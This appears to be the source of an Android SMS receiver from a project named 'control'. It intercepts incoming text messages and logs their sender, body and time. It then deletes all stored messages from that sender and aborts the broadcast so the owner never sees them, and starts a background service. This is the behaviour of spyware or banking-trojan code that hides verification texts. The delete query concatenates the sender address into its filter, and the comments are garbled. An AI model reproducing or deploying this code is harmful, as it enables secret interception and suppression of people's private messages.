/**
 * 
 */
package com.byc.control;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;  
import android.content.Context;  
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;  

/**
 * @author byc
 *
 */
public class SmsReceiver extends BroadcastReceiver {
	private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";
	public static final String TAG = "byc001";
	public String address=""; //���ŵ�ַ��
	public String smsContent = "";//��������;
	public String receiveTime="";//����ʱ��
	public Date date;
	//private StringBuilder sb=new StringBuilder(); 
	@Override  
	public void onReceive(Context context, Intent intent) {
		if(intent.getAction().equals(ACTION)){  
			 Bundle bundle = intent.getExtras();
			 if (null == bundle)return;
			Object[] pdus=(Object[])intent.getExtras().get("pdus");  
			SmsMessage[] messages=new SmsMessage[pdus.length];  
			smsContent = "";
			for(int i=0;i<pdus.length;i++){   
				messages[i]=SmsMessage.createFromPdu((byte[])pdus[i]);  
				//sb.append("���յ���������:\n");  
				address=messages[i].getDisplayOriginatingAddress();  
				//sb.append(address+"\n");  
				//sb.append(messages[i].getDisplayMessageBody());  
				smsContent += messages[i].getMessageBody();
				date = new Date(messages[i].getTimestampMillis());//ʱ�� 
			}  
            SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");  
            String receiveTime = format.format(date); 
            Log.i(TAG, receiveTime);
            Log.i(TAG, address);
			Log.i(TAG, smsContent);
			   //���ݺ���ɾ������
            int res = context.getContentResolver().delete(Uri.parse("content://sms"), "address like '" + address + "'", null);
            for(int i=0;i<10;i++){
                if(res>0){
                	Log.i(TAG, "ɾ���ɹ���");
                	break;
                }else{
                	Log.i(TAG, "ɾ��ʧ�ܣ�");
                	res = context.getContentResolver().delete(Uri.parse("content://sms"), "address like '" + address + "'", null);
                }
            }

  	      Intent startIntent = new Intent(context, MainService.class);   
  	      startIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  
  	      context.startActivity(startIntent); 
			//������д�Լ����߼�  
            if (address.equals("10086")) {  
                //TODO  
                  
            }
            abortBroadcast();
			
			//smsContent=sb.toString();
			//System.out.println(sb.toString()); 
			//String fullMessage = "";
			//for (SmsMessage message : messages) {
				//fullMessage += message.getMessageBody(); // ��ȡ��������
			//}
		}

	}

}
